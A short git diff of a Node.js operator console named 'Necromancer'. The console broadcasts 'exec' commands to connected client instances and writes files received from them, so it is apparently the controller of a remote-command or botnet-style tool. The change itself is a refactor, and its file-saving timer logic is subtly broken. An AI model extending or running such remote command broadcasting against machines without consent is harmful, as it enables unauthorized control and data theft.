@@ -1,5 +1,5 @@
 import readline from "readline";
-import * as fs from "fs";
+import fs from "fs";
 import { clientModules, broadcast } from "./server.js";
 
 const rl = readline.createInterface({
@@ -13,6 +13,8 @@ function prompt() {
 	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
 		message = message.toLowerCase();
 		const arg = message.split(" ");
+
+		if (message.startsWith("exec")) broadcast(message);
 
 		if (message.startsWith("instances")) {
 			if (message === "instances") {
@@ -89,19 +91,19 @@ function prompt() {
 			}
 		}
 
-		if (message.startsWith("exec")) broadcast(message);
+		if (message === "exit") process.exit(0);
 
 		return prompt();
 	});
 }
 
-function saveFile(chunk) {
+function saveFile(buffer) {
 	let timer;
 	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
-	let tempChunk = chunk;
+	let tempBuffer = buffer;
 
-	writeStream.write(chunk);
-	if (tempChunk === chunk) clearTimeout(timer);
+	writeStream.write(buffer);
+	if (tempBuffer === buffer) clearTimeout(timer);
 
 	timer = setTimeout(() => {
 		writeStream.end();
